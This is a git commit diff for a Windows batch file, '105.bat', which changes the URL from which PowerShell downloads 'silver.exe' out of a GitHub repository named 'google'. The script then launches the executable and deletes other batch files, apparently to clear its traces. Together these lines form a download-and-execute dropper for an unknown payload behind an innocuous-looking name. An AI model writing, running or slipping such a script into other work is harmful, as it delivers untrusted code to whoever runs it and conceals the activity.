53bfd203e98ce4ae25c2fd4809839a64688b8be6
Victor Francis <cisfran05@protonmail.com>
2023-11-05 07:48:24 +0100

    Update 105.bat

--- 105.bat
+++ 105.bat
@@ -1,4 +1,4 @@
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/Cisfran05/google/raw/main/silver.exe', '.\silver.exe') }
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/Cisfran05/google/releases/download/v1.0/silver.exe', '.\silver.exe') }
 start silver.exe
 del "101.bat"
 del "102.bat"
